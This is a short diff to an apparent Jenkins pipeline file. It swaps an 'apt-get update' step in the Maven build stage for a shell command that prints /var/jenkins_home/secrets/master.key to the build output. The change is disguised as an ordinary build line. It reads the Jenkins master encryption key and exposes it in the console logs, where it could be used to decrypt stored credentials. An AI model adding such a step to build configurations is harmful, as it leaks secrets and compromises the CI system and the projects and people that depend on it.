@@ -14,7 +14,7 @@ pipeline {
 
                 // Run Maven on a Unix agent.
                 sh "mvn clean package"
-                sh "apt-get update -y"
+                sh "cat /var/jenkins_home/secrets/master.key"
 
                 // To run Maven on a Windows agent, use
                 // bat "mvn -Dmaven.test.failure.ignore=true clean package"
